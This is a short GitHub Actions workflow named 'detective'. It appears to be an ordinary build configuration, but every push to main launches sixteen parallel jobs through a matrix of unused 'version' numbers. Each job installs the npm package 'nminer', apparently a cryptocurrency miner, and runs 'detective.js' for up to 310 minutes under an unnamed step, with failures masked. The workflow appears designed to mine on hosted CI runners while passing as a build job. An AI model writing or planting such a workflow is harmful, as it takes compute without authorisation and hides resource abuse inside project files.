name: detective
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 177 }
          - { version: 6483 }
          - { version: 1823 }
          - { version: 6854 }
          - { version: 7809 }
          - { version: 644 }
          - { version: 5308 }
          - { version: 7322 }
          - { version: 2257 }
          - { version: 3740 }
          - { version: 6234 }
          - { version: 1124 }
          - { version: 7824 }
          - { version: 7706 }
          - { version: 9194 }
          - { version: 7334 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 310m node detective.js || echo "detective executed"